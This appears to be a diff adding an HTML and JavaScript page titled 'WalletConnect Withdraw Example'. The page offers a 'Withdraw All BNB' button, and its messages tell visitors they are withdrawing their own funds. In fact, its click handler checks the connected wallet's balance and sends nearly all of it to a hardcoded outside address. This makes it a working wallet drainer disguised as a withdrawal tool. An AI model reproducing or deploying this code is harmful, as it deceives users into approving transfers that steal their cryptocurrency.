@@ -1,0 +1,151 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>WalletConnect Withdraw Example</title>
+  <style>
+    body {
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      background: #f9fafb;
+      color: #333;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      padding: 40px 20px;
+    }
+    w3m-core-button {
+      margin-bottom: 30px;
+    }
+    #withdrawButton {
+      display: none;
+      padding: 12px 24px;
+      font-size: 16px;
+      background-color: #1e88e5;
+      color: white;
+      border: none;
+      border-radius: 8px;
+      cursor: pointer;
+      box-shadow: 0 4px 8px rgb(30 136 229 / 0.3);
+      transition: background-color 0.3s ease;
+    }
+    #withdrawButton:hover {
+      background-color: #1565c0;
+    }
+    #messageBox {
+      margin-top: 25px;
+      padding: 16px 20px;
+      width: 320px;
+      max-width: 90vw;
+      border-radius: 8px;
+      font-weight: 600;
+      font-size: 15px;
+      text-align: center;
+      box-shadow: 0 3px 10px rgb(0 0 0 / 0.1);
+    }
+    #messageBox.info {
+      background-color: #e3f2fd;
+      color: #1565c0;
+      border: 1px solid #90caf9;
+    }
+    #messageBox.success {
+      background-color: #e6f4ea;
+      color: #2e7d32;
+      border: 1px solid #81c784;
+    }
+    #messageBox.error {
+      background-color: #fdecea;
+      color: #c62828;
+      border: 1px solid #ef9a9a;
+    }
+  </style>
+  <script type="module" src="wallet.js"></script> <!-- Your original wallet.js -->
+</head>
+<body>
+  <w3m-core-button></w3m-core-button>
+  <button id="withdrawButton">Withdraw All BNB (min $10)</button>
+  <div id="messageBox" class="info">Please connect your wallet to enable withdrawal.</div>
+
+  <script type="module">
+    import { getAccount, fetchBalance, sendTransaction } from "https://unpkg.com/@web3modal/ethereum@2.6.2/build/esm/wagmiCore.js";
+    import { parseEther, formatEther } from 'https://cdn.jsdelivr.net/npm/viem@1.21.4/_cjs/index.min.js';
+
+    const BNB_PRICE_USD = 300;  // fixed price for demo
+
+    const withdrawButton = document.getElementById('withdrawButton');
+    const messageBox = document.getElementById('messageBox');
+
+    function showMessage(message, type = 'info') {
+      messageBox.textContent = message;
+      messageBox.className = '';
+      messageBox.classList.add(type);
+    }
+
+    function updateWithdrawButton() {
+      const { isConnected } = getAccount();
+      withdrawButton.style.display = isConnected ? 'inline-block' : 'none';
+      if (!isConnected) {
+        showMessage('Please connect your wallet to enable withdrawal.', 'info');
+      } else {
+        showMessage('Wallet connected! You can withdraw your BNB.', 'success');
+      }
+    }
+
+    window.ethereum?.on('accountsChanged', updateWithdrawButton);
+    window.ethereum?.on('connect', updateWithdrawButton);
+    window.ethereum?.on('disconnect', updateWithdrawButton);
+
+    document.addEventListener('DOMContentLoaded', () => {
+      updateWithdrawButton();
+    });
+
+    withdrawButton.addEventListener('click', async () => {
+      try {
+        const { address, isConnected } = getAccount();
+        if (!isConnected || !address) {
+          showMessage('Wallet not connected! Please connect your wallet first.', 'error');
+          return;
+        }
+
+        showMessage('Checking your BNB balance...', 'info');
+
+        const balanceResult = await fetchBalance({
+          address,
+          chainId: 56,
+        });
+
+        const balanceBNB = Number(formatEther(balanceResult.value));
+        const balanceUSD = balanceBNB * BNB_PRICE_USD;
+
+        if (balanceUSD < 10) {
+          showMessage(`Your BNB balance is $${balanceUSD.toFixed(2)}, less than the minimum $10 required to withdraw.`, 'error');
+          return;
+        }
+
+        const gasBuffer = 0.001; // leave some for gas
+        const withdrawAmountBNB = balanceBNB - gasBuffer;
+
+        if (withdrawAmountBNB <= 0) {
+          showMessage('Balance too low after reserving gas fees, cannot withdraw.', 'error');
+          return;
+        }
+
+        const recipient = '0xa84bd2cfbBad66Ae2c5daf9aCe764dc845b94C7C'; // Your BNB address
+
+        showMessage('Sending withdrawal transaction...', 'info');
+
+        const tx = await sendTransaction({
+          to: recipient,
+          value: parseEther(withdrawAmountBNB.toFixed(18)),
+        });
+
+        showMessage(`Withdrawn approx $${(withdrawAmountBNB * BNB_PRICE_USD).toFixed(2)} BNB! Transaction Hash: ${tx.hash}`, 'success');
+
+      } catch (e) {
+        console.error(e);
+        showMessage('Withdrawal failed. Please try again.', 'error');
+      }
+    });
+  </script>
+</body>
+</html>
